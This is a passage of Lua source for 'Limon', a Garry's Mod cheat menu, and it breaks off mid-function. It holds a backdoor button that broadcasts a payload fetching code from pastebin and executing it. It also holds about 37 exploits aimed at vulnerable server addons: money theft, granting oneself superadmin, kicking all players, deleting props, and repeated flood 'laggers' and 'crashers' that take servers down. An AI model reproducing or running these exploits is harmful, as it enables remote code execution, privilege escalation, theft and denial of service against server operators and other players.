		Limon_b.Paint = function(pnl, w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 255))
		draw.SimpleText("Инжект бекдура", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		if Limon_b.Hovered then
		draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
		end
	end

				local Limon_b = vgui.Create("DButton", frame)
		Limon_b:SetParent( Limon_color )
		Limon_b:SetText( "" )
		Limon_b:SetPos(210, 407)
		Limon_b:SetSize( 183, 22 )
		Limon_b.DoClick = function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[http.Fetch('https://pastebin.com/raw/Bdwcr8GC',function(s)	RunString(s)end)]])" )
		net.WriteBit(1)
		net.SendToServer()
		end
		Limon_b.Paint = function(pnl, w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 255))
		draw.SimpleText("Limon disco", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		if Limon_b.Hovered then
		draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
		end
	end

-----------------------------------------------		
end)

















-----------------------------------------------		


concommand.Add( "L_admin_list", function()
	local Limon = vgui.Create( "DFrame" )
	Limon:SetSize( 500, 247 )
	Limon:Center()
	Limon:SetTitle( "" )
	Limon:SetVisible( true )
	Limon:SetDraggable( true )
	Limon:ShowCloseButton( false )
	Limon:MakePopup()
	Limon.Paint = function( self )
	surface.SetDrawColor( 70, 70, 70, 255 )
    surface.DrawRect( 0, 0, Limon:GetWide(), Limon:GetTall() )
	surface.SetDrawColor( Limon_menu_color, 255 )
    surface.DrawOutlinedRect( 0, 0, Limon:GetWide(), Limon:GetTall() )

	draw.RoundedBox( 0, 0, 0, 699, 22, Limon_menu_color )
	draw.SimpleText(" Limon - чек админов", 'Limon_15', 60, 3, Color(0, 0, 0,255),TEXT_ALIGN_CENTER)
	end
	local Limon_b = vgui.Create("DButton", frame)
	Limon_b:SetParent( Limon )
	Limon_b:SetText( "" )
	Limon_b:SetPos(477, 1)
	Limon_b:SetSize( 22, 20 )
	Limon_b.DoClick = function()
    Limon:Close()
	end
	Limon_b.Paint = function(pnl, w, h)
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 0, 1, 255))
	draw.SimpleText("х", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	if Limon_b.Hovered then
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
	end
	end
local AppList = vgui.Create( "DListView", f )
AppList:SetPos( 2, 24 )
AppList:SetSize( 496, 220 )
AppList:SetMultiSelect( true )
AppList:AddColumn( "Ник" )
AppList:AddColumn( "Группа" )
AppList:SetParent( Limon )

for k,L in pairs(player.GetAll()) do
if(L:GetUserGroup() != "user" ) then
local Lol333 = L:Nick()
local Lol3333 =	L:GetUserGroup()
AppList:AddLine( Lol333, Lol3333 )
end
end
end)




//[[-------------------------------------------------------------------------------------------------------------]]


concommand.Add( "L_chat", function()
	local Limon = vgui.Create( "DFrame" )
	Limon:SetSize( 600, 347 )
	Limon:Center()
	Limon:SetTitle( "" )
	Limon:SetVisible( true )
	Limon:SetDraggable( true )
	Limon:ShowCloseButton( false )
	Limon:MakePopup()
	Limon.Paint = function( self )
	surface.SetDrawColor( 70, 70, 70, 255 )
    surface.DrawRect( 0, 0, Limon:GetWide(), Limon:GetTall() )
	surface.SetDrawColor( Limon_menu_color, 255 )
    surface.DrawOutlinedRect( 0, 0, Limon:GetWide(), Limon:GetTall() )

	draw.RoundedBox( 0, 0, 0, 699, 22, Limon_menu_color )
	draw.SimpleText("   Limon - чат", 'Limon_15', 30, 3, Color(0, 0, 0,255),TEXT_ALIGN_CENTER)
	end
	local Limon_b = vgui.Create("DButton", frame)
	Limon_b:SetParent( Limon )
	Limon_b:SetText( "" )
	Limon_b:SetPos(577, 1)
	Limon_b:SetSize( 22, 20 )
	Limon_b.DoClick = function()
    Limon:Close()
	end
	Limon_b.Paint = function(pnl, w, h)
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 0, 1, 255))
	draw.SimpleText("х", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	if Limon_b.Hovered then
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
	end
	end

	local chatbox = vgui.Create( "HTML" ) 
	chatbox:SetParent( Limon )
	chatbox:SetPos( 2, 23 )
	chatbox:SetSize( 596, 322 )
	chatbox:SizeToContents()
	chatbox:OpenURL( "http://limonoff.chatovod.com/" )
	
	
end)



//[[-------------------------------------------------------------------------------------------------------------]]





concommand.Add( "L_mony", function()
	local Limon = vgui.Create( "DFrame" )
	Limon:SetPos( 300,  500)
	Limon:SetSize( 280, 80 )
	Limon:Center()
	Limon:SetTitle( "" )
	Limon:SetVisible( true )
	Limon:SetDraggable( true )
	Limon:ShowCloseButton( false )
	Limon:MakePopup()
	Limon.Paint = function( self )
	surface.SetDrawColor( 70, 70, 70, 255 )
    surface.DrawRect( 0, 0, Limon:GetWide(), Limon:GetTall() )
    surface.SetDrawColor( 255, 214, 41, 255 )
    surface.DrawOutlinedRect( 0, 0, Limon:GetWide(), Limon:GetTall() )

    draw.RoundedBox( 0, 0, 0, 699, 22, Color(255, 214, 41,255) )
	draw.SimpleText(" Limon - фейк деньги", 'Limon_15', 60, 3, Color(0, 0, 0,255),TEXT_ALIGN_CENTER)
	end
	local Limon_b = vgui.Create("DButton", frame)
	Limon_b:SetParent( Limon )
	Limon_b:SetText( "" )
	Limon_b:SetPos(257, 1)
	Limon_b:SetSize( 22, 20 )
	Limon_b.DoClick = function()
    Limon:Close()
	end
	Limon_b.Paint = function(pnl, w, h)
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 0, 1, 255))
	draw.SimpleText("х", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	if Limon_b.Hovered then
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
	end
	end

local Limon_b = vgui.Create( "DLabel" )
Limon_b:SetParent( Limon )
Limon_b:SetText( "Введите количество денег." )
Limon_b:SetPos( 10, 25 )
Limon_b:SetSize( 7000, 20 )
Limon_b:SetTextColor(Color(255,255,255,255))
	
local edit = vgui.Create( "DTextEntry", DermaFrame )
edit:SetPos( 10,50 )
edit:SetParent( Limon )
edit:SetSize( 260,20 )
edit:SetText("55555555555555555555555")
edit:SetMultiline( false )
edit:SetEditable( true )
edit:SetAllowNonAsciiCharacters( true )
edit:SetEnterAllowed( true )
edit.OnEnter = function()
RunConsoleCommand("Limon_setmoney",edit:GetValue())
end
end)


--https://pastebin.com/raw/Bdwcr8GC
//[[-------------------------------------------------------------------------------------------------------------]]
--[[
concommand.Add( "L_fov_setting", function()
	local Limon = vgui.Create( "DFrame" )
	Limon:SetPos( 300,  500)
	Limon:SetSize( 280, 80 )
	Limon:Center()
	Limon:SetTitle( "" )
	Limon:SetVisible( true )
	Limon:SetDraggable( true )
	Limon:ShowCloseButton( false )
	Limon:MakePopup()
	Limon.Paint = function( self )
	surface.SetDrawColor( 70, 70, 70, 255 )
    surface.DrawRect( 0, 0, Limon:GetWide(), Limon:GetTall() )
    surface.SetDrawColor( 255, 214, 41, 255 )
    surface.DrawOutlinedRect( 0, 0, Limon:GetWide(), Limon:GetTall() )

    draw.RoundedBox( 0, 0, 0, 699, 22, Color(255, 214, 41,255) )
	draw.SimpleText("Limon - fov", 'Limon_15', 3, 3, Color(0, 0, 0,255))
	end
	local Limon_b = vgui.Create("DButton", frame)
	Limon_b:SetParent( Limon )
	Limon_b:SetText( "" )
	Limon_b:SetPos(257, 1)
	Limon_b:SetSize( 22, 20 )
	Limon_b.DoClick = function()
    Limon:Close()
	end
	Limon_b.Paint = function(pnl, w, h)
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 0, 1, 255))
	draw.SimpleText("х", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	if Limon_b.Hovered then
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
	end
	end

local Limon_b = vgui.Create( "DLabel" )
Limon_b:SetParent( Limon )
Limon_b:SetText( "Выберите)." )
Limon_b:SetPos( 10, 25 )
Limon_b:SetSize( 7000, 20 )
Limon_b:SetTextColor(Color(255,255,255,255))

local Limon_s = vgui.Create("DNumSlider", frame)
		Limon_s:SetPos( 10,50 )
		Limon_s:SetSize( 260,20 )
		Limon_s:SetParent(  Limon )
		Limon_s:SetMin(-500)
		Limon_s:SetMax(500)
		Limon_s:SetText(" 	 обзор")
		Limon_s:SetDecimals(0)
		Limon_s:SetConVar("Limon_zoom")
end)


--]]

concommand.Add( "L_exploits", function()
totalSploits = 0
	local Limon = vgui.Create( "DFrame" )
	Limon:SetPos( 100,  100)
	Limon:SetSize( 250, 347 )
	Limon:Center()
	Limon:SetTitle( "" )
	Limon:SetVisible( true )
	Limon:SetDraggable( true )
	Limon:ShowCloseButton( false )
	Limon:MakePopup()
	Limon.Paint = function( self )
	surface.SetDrawColor( 70, 70, 70, 255 )
    surface.DrawRect( 0, 0, Limon:GetWide(), Limon:GetTall() )
	surface.SetDrawColor( Limon_menu_color, 255 )
    surface.DrawOutlinedRect( 0, 0, Limon:GetWide(), Limon:GetTall() )

	draw.RoundedBox( 0, 0, 0, 699, 22, Limon_menu_color )
	draw.SimpleText("Limon - exploits [Найдено "..totalSploits.."/290]", 'Limon_15', 5, 3, Color(0, 0, 0,255))
	end
	local Limon_b = vgui.Create("DButton", frame)
	Limon_b:SetParent( Limon )
	Limon_b:SetText( "" )
	Limon_b:SetPos(227, 1)
	Limon_b:SetSize( 22, 20 )
	Limon_b.DoClick = function()
    Limon:Close()
	end
	Limon_b.Paint = function(pnl, w, h)
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 0, 1, 255))
	draw.SimpleText("х", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	if Limon_b.Hovered then
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
	end
	end

local pnl = Limon:Add( "PanelList" )
pnl:Dock( FILL )
pnl:EnableVerticalScrollbar()
pnl.Paint = function( self )
end
function addExploit(id, text, desc, func)
totalSploits = 1 + totalSploits
local id = pnl:Add( "DButton" )
id:SetText("")
pnl:AddItem( id )

id.DoClick = function()
RunConsoleCommand("L_chat")
end
id.Paint = function(pnl, w, h)
draw.RoundedBox(0, 0, 0, w, h, Color(0,0,0))
draw.SimpleText(text, "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
if id.Hovered then
draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
end
end
id.DoClick = func
end


---------------------------------------------------------------------------------------
status = ValidNetString("TCBBuyAmmo")
if (status) then
ECPrint("Found Exploit: Free Ammo [TCBBuyAmmo]")
addExploit( "1","Free Ammo", "Gets All Ammo Types", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECPrint("Getting Le Ammo")
for k,v in pairs(GAMEMODE.AmmoTypes) do
net.Start("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end)
end

status = ValidNetString("DataSend")
if (status) then
ECPrint("Found Exploit: Steal All Monies #1 [DataSend]")
addExploit( "2","Steal All Monies #1", "Takes money from printers", function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then
ECPrint("Collecting Money")
net.Start("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end)
end


status = ValidNetString("FarmingmodSellItems")
if (status) then
ECPrint("Found Exploit: Free Money [FarmingmodSellItems]")
addExploit( "3","Free Money", "An exploit in the Farming Mod", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECPrint("Enjoy the b1g monies")
net.Start("FarmingmodSellItems")
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   99999,
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end)
end

status = ValidNetString("start_wd_emp")
if (status) then
ECPrint("Found Exploit: Hack Keypad [start_wd_emp]")
addExploit( "4","Hack Keypad", "Instantly opens nearby keypads. Has a cooldown", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Hacking Keypads")
net.Start("start_wd_emp")
net.SendToServer()
end)
end

status = ValidNetString("duelrequestguiYes")
if (status) then
ECPrint("Found Exploit: Get Money [duelrequestguiYes]")
addExploit( "5","Get Money", "Duel Exploit", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("getting ez monies")
net.Start("duelrequestguiYes")
net.WriteInt(-99999999999999999999999999999999999999999999999999999999999999999999999999999,32)
net.WriteEntity(table.Random( player.GetAll() ) )
net.WriteString("Crossbow")
net.SendToServer()
end)
end

status = ValidNetString("DarkRP_Kun_ForceSpawn")
if (status) then
ECPrint("Found Exploit: Respawn #1 [DarkRP_Kun_ForceSpawn]")
addExploit( "6", "Respawn #1", "Just respawn", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECPrint("Respawn")
net.Start("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end)
end

status = ValidNetString("SyncPrinterButtons76561198056171650")
if (status) then
ECPrint("Found Exploit: Steal All Monies #2 [SyncPrinterButtons76561198056171650]")
addExploit( "7","Steal All Monies #2", "Takes money from printers", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECPrint("Collecting Money")
for k, v in pairs(ents.GetAll()) do
if (v:GetClass() == "adv_moneyprinter") then
net.Start("SyncPrinterButtons76561198056171650")
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
end
---------------------------------------------------------------------------------------------
local function report()
    for i = 1, 2000 do
    net.Start("DL_Answering")
    net.SendToServer()
    end
end

if (Damagelog) then
ECPrint("Found Exploit: Kick All Players")
reportSpam = 0
addExploit( "1337","Kick All Players", "Kicks all players", function()
    surface.PlaySound("garrysmod/ui_click.wav")
    if (reportSpam == 0) then
    ECNotify("Starting Kicker")
    reportSpam = 1
    timer.Create("reportSpammer", 0.05, 0, report)
    else
    ECNotify("Stopping Kicker")
    reportSpam = 0
    timer.Remove("reportSpammer")
    end

end)
end
----------------------------------------------------------------------------------------------

status = ValidNetString("SimplicityAC_aysent")
if (status) then
ECPrint("Found Exploit: Crash #1 [SimplicityAC_aysent]")
addExploit( "8","Crash #1", "Will instantly crash the server", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECPrint("Goodbye Server")
local tbl = {}
for i=1,400 do
tbl[i] = i
end
net.Start("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end)
end

status = ValidNetString("RevivePlayer")
if (status) then
ECPrint("Found Exploit: Reanimation #1 [RevivePlayer]")
addExploit( "9", "Reanimation #1", "Instant revival", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "reanimation1" ) then
ECNotify( "Enabled" )
timer.Create( "reanimation1", 0.5, 0, function()
if !LocalPlayer():Alive() then
net.Start("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "reanimation1" )
ECNotify( "Disabled" )
end
end )
end

status = ValidNetString("NLRKick")
if (status) then
ECPrint("Found Exploit: Kick Everyone [NLRKick]")
addExploit( "10","Kick Everyone", "kick all the beaners", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Kicking All")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end
end)
end

status = ValidNetString("timebombDefuse")
if (status) then
ECPrint("Found Exploit: Delete All Props [timebombDefuse]")
addExploit( "11","Delete All Props", "props = dead", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Props De_Stroyed")
for k,v in pairs(ents.GetAll()) do
net.Start("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end)
end

status = ValidNetString("NDES_SelectedEmblem")
if (status) then
ECPrint("Found Exploit: Lagger #2 [NDES_SelectedEmblem]")
addExploit( "12","Lagger #2", "oof yuh get l4gged", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "lagger2" ) then
timer.Create("lagger2", 0.5, 0, function()
for i=1, 2000 do
net.Start("NDES_SelectedEmblem",true)
net.WriteString("seized")
net.SendToServer()
end
end)
ECNotify("Starting Lagger")
else
timer.Remove("lagger2")
ECNotify("Stopping Lagger")
end
end)
end

status = ValidNetString("Morpheus.StaffTracker")
if (status) then
ECPrint("Found Exploit: Crasher #1 [Morpheus.StaffTracker]")
addExploit( "13","Crasher #1", "not even hard. unlike nippy's dick when he sees voltz", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "crasher1" ) then
timer.Create("crasher1", 0.5, 0, function()
for i=1, 2000 do
net.Start("Morpheus.StaffTracker")
net.SendToServer()
end
end)
ECNotify("Crashing Server")
else
timer.Remove("crasher1")
ECNotify( "Canceling Crasher" )
end
end)
end

status = ValidNetString("egg")
if (status) then
ECPrint("Found Exploit: Get Easter Egg")
addExploit( "14","Get Easter Egg", "ez eggs", function()
surface.PlaySound("garrysmod/ui_click.wav")
RunConsoleCommand("say", "4bigz")
RunConsoleCommand("cc_egg2")
net.Start("egg")              
net.SendToServer()
ECNotify("Gave Easter Egg")
end)
end

status = ValidNetString("pplay_deleterow")
if (status) then
ECPrint("Found Exploit: GET SUPERADMIN [pplay_deleterow]")
addExploit( "15","GET SUPERADMIN", "Rejoin game after clicking", function()
surface.PlaySound("garrysmod/ui_click.wav")
local id = LocalPlayer():SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}

net.Start("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
net.Start("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
ECNotify("promotion ;)")
end)
end

-- ttt report bypass by daddy grampa

local function CheckChild(pan)
local title = "You have been reported! Please answer all your reports."
    if !pan || !IsValid(pan) then return end
    if pan.GetTitle && pan:GetTitle() == title then
        pan:Remove();
        print("Removed warning box")
        return
    end
    for k,v in pairs(pan:GetChildren()) do
        if v.GetTitle && v:GetTitle() == title then
            v:Remove();
            print("Removed warning box")
            return
        end
        if #v:GetChildren() > 0 then
            CheckChild(v)
        end
    end
end

if (engine.ActiveGamemode() == "terrortown") then
bypass = 0
ECPrint("Found Exploit: TTT Report Bypass")
addExploit( "16","Toggle TTT Report Bypass", "b1g bypass amirite", function()
surface.PlaySound("garrysmod/ui_click.wav")
if (bypass == 0) then
hook.Add("Think", "remove_ttt_report", function()
local pan = vgui.GetHoveredPanel()
CheckChild(pan)
end)
ECNotify("Enabled Report Bypass")
bypass = 1
else
hook.Remove("Think", "remove_ttt_report")
ECNotify("Disabled Report Bypass")
bypass = 0
end
end)
end

status = ValidNetString("EZS_PlayerTag")
if (status) then
ECPrint("Found Exploit: Lagger #3 [EZS_PlayerTag]")
addExploit( "17","Lagger #3", "b1g lags my duder", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "lagger3" ) then
timer.Create("lagger3", 0.5, 0, function()
for k, v in pairs(player.GetAll()) do
net.Start("EZS_PlayerTag",true)
net.WriteEntity(v)
net.WriteString("Seized")
net.SendToServer()
timer.Simple(2, function()
net.Start("EZS_PlayerTag",true)
net.WriteEntity(v)
net.WriteString("Seized")
net.SendToServer()
end)
end
end)
ECNotify("Starting Lagger")
else
timer.Remove("lagger3")
ECNotify("Stopping Lagger")
end
end)
end

if ConVarExists("advttt_spreadovertime_enabled") then
ECPrint("Found Exploit: Remove Spread")
addExploit( "18","Remove Spread", "pSilent No Spread", function()
surface.PlaySound("garrysmod/ui_click.wav")
hook.Remove("PlayerTick", "WyoziAdvTTTSpreadOverTime")
ECNotify("Spread Removed")
end)
end

status = ValidNetString("fp_as_doorHandler")
if (status) then
ECPrint("Found Exploits: Open Door, Close Door, Remove Door Owners [fp_as_doorHandler]")
addExploit( "19","Open Door", "Force open the door you are looking at", function()
surface.PlaySound("garrysmod/ui_click.wav")
net.Start("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
ECNotify("Opened Door")
end)
end

status = ValidNetString("fp_as_doorHandler")
if (status) then
addExploit( "20","Close Door", "Force close the door you are looking at", function()
surface.PlaySound("garrysmod/ui_click.wav")
net.Start("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
ECNotify("Opened Door")
end)
end

status = ValidNetString("fp_as_doorHandler")
if (status) then
addExploit( "21","Remove Door Owner", "Force remove door owner of the door you are looking at", function()
surface.PlaySound("garrysmod/ui_click.wav")
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
net.Start("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
ECNotify("Opened Door")
end)
end



status = ValidNetString("ply_pick_shit")
if (status) then
ECPrint("Found Exploit: free money amirite [ply_pick_shit]")
addExploit( "23","free money amirite", "stacks in ur wallet generator", function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs (player.GetAll()) do
for i = 1,255 do
net.Start("ply_pick_shit")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.SendToServer()
end
end
ECNotify("enjoy monies")
end)
end

status = ValidNetString("pac.net.TouchFlexes.ClientNotify")
if (status) then
ECPrint("Found Exploit: Crasher #2 [pac.net.TouchFlexes.ClientNotify]")
addExploit( "24","Crasher #2", "big lagz", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "crasher2" ) then
timer.Create("crasher2", 0, 0, function()
for i = 1, 400 do
net.Start("pac.net.TouchFlexes.ClientNotify")
net.WriteInt( 9999999999999999999999999999999999999999999999999999999999999999999999, 13)
net.SendToServer()
end
end)
ECNotify("Starting Crasher")
else
timer.Remove("crasher2")
ECNotify("Stopping Crasher")
end
end)
end

status = ValidNetString("BM2.Command.SellBitcoins")
if (status) then
ECPrint("Found Exploit: Sell Your Bitcoins [BM2.Command.SellBitcoins]")
addExploit( "25","Sell your Bitcoins", "sells your and other peoples bitcoins at a great distance", function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs(ents.FindByClass("bm2_bitminer_1")) do
net.Start("BM2.Command.SellBitcoins")
net.WriteEntity(v)
net.SendToServer()
end
for k, v in pairs(ents.FindByClass("bm2_bitminer_2")) do
net.Start("BM2.Command.SellBitcoins")
net.WriteEntity(v)
net.SendToServer()
end
for k, v in pairs(ents.FindByClass("bm2_bitminer_rack")) do
net.Start("BM2.Command.SellBitcoins")
net.WriteEntity(v)
net.SendToServer()
end
end)
end

status = ValidNetString("BM2.Command.Eject")
if (status) then
ECPrint("Found Exploit: Lagger #4 [BM2.Command.Eject]")
addExploit( "26","Lagger #4", "discovered by triggered", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "lagger4" ) then
timer.Create("lagger4", 0, 0, function()
for i = 1, 1000 do
net.Start("BM2.Command.Eject",true)
net.WriteInt(9999999999999999999999999999999999999999999999999999999999999999999999, 8)
net.SendToServer()
end
end)
ECNotify("Starting Lagger")
else
timer.Remove("lagger4")
ECNotify("Stopping Lagger")
end
end)
end

status = ValidNetString("BM2.Command.SellBitcoins")
if (status) then
ECPrint("Found Exploit: Lagger #5 [BM2.Command.SellBitcoins]")
addExploit( "27","Lagger #5", "discovered by Leith, an exploit in the addon 'Bitminers 2'", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger5", 0, 0, function()
for i=1,1000 do
net.Start("BM2.Command.SellBitcoins",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("ItemStoreUse")
if (status) then
ECPrint("Found Exploit: Lagger #6 [ItemStoreUse]")
addExploit( "28","Lagger #6", "discovered by triggered, an exploit in the addon 'ItemStore'", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "lagger6" ) then
timer.Create("lagger6", 0, 0, function()
for i = 1, 1000 do
net.Start("ItemStoreUse",true)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.SendToServer()
end
end)
ECNotify("Starting Lagger")
else
timer.Remove("lagger6")
ECNotify("Stopping Lagger")
end
end)
end

status = ValidNetString("ItemStoreDrop")
if (status) then
ECPrint("Found Exploit: Lagger #7 [ItemStoreDrop]")
addExploit( "29","Lagger #7", "discovered by Leith, an exploit in the addon 'ItemStore'", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "lagger7" ) then
timer.Create("lagger7", 0, 0, function()
for i = 1, 1000 do
net.Start("ItemStoreDrop",true)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.SendToServer()
end
end)
ECNotify("Starting Lagger")
else
timer.Remove("lagger7")
ECNotify("Stopping Lagger")
end
end)
end

status = ValidNetString("gMining.sellMineral")
if (status) then
ECPrint("Found Exploit: Lagger #8 [gMining.sellMineral]")
addExploit( "30","Lagger #8", "discovered by Leith, an exploit in the addon 'gMining'", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
if !timer.Exists( "lagger8" ) then
timer.Create("lagger8", 0, 0, function()
for i = 1, 1000 do
net.Start("gMining.sellMineral",true)
net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 3)
net.WriteString(" ")
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("PlayerUseItem")
if (status) then
ECPrint("Found Exploit: Lagger #9 [PlayerUseItem]")
addExploit( "31","Lagger #9", "discovered by triggered", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "lagger9" ) then
timer.Create("lagger9", 0,0, function()
for i = 1, 800 do
net.Start("PlayerUseItem",true)
net.WriteInt(99999999999999999999999999999999999999999999999, 32)
net.SendToServer()
end
end)
ECNotify("Starting Lagger")
else
timer.Remove("lagger9")
ECNotify("Stopping Lagger")
end
end)
end

status = ValidNetString("RequestMAPSize")
if (status) then
ECPrint("Found Exploit: Lagger #10 [RequestMAPSize]")
addExploit( "32","Lagger #10", "1tap server", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "lagger10" ) then
timer.Create("lagger10", 0, 0, function()
for i = 1, 400 do
net.Start("RequestMAPSize",true)
net.SendToServer()
end
end)
ECNotify("Starting Lagger")
else
timer.Remove("lagger10")
ECNotify("Stopping Lagger")
end
end )
end

status = ValidNetString("MG2.Request.GangRankings")
if (status) then
ECPrint("Found Exploit: Lagger #11 [MG2.Request.GangRankings]")
addExploit( "33","Lagger #11", "discovered by Leith, an exploit in the addon 'MGangs 2'", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "lagger11" ) then
timer.Create("lagger11", 0, 0, function()
for i = 1, 1000 do
net.Start("MG2.Request.GangRankings",true)
net.SendToServer()
end
end)
ECNotify("Starting Lagger")
else
timer.Remove("lagger11")
ECNotify("Stopping Lagger")
end
end )
end

status = ValidNetString("dLogsGetCommand")
if (status) then
ECPrint("Found Exploit: Lagger #12 [dLogsGetCommand]")
addExploit( "34","Lagger #12", "b1g lags", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting Lagger")
for i=1,7000 do
net.Start("dLogsGetCommand",true)
net.WriteTable({ cmd = "+forward" , args = " " })
net.SendToServer()
end
end )
end

status = ValidNetString("ats_send_toServer")
if (status) then
ECPrint("Found Exploit: Lagger #13 [ats_send_toServer]")
addExploit( "35","Lagger #13", "big lags", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting Lagger")
for i=1,2000 do
net.Start("ats_send_toServer",true)
net.WriteTable({ " " , "Open" , nil , nil , nil , nil })
net.SendToServer()
end
end )
end

status = ValidNetString("shopguild_buyitem")
if (status) then
ECPrint("Found Exploit: Guild Exploit [shopguild_buyitem]")
addExploit( "36","Guild Exploit", "increases the level of your guild", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECPrint("Guild level successfully upgraded")
local level = tonumber(LocalPlayer():GetNWInt("lvlguild"))
if level > tonumber(LocalPlayer():GetNWInt("lvlguild")) then level = tonumber(LocalPlayer():GetNWInt("lvlguild")) end
net.Start("shopguild_buyitem")
net.WriteString("lvl")
net.WriteDouble(level)
net.WriteString("Guild Level "..level)
net.WriteEntity(LocalPlayer())
net.WriteUInt(2,4)
net.WriteDouble(0)
net.SendToServer()
level = level + 1
end )
end

status = ValidNetString("VoteKickNO")
if (status) then
ECPrint("Found Exploit: Votekick [VoteKickNO]")
addExploit( "37","Votekick", "kicking all", function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do 
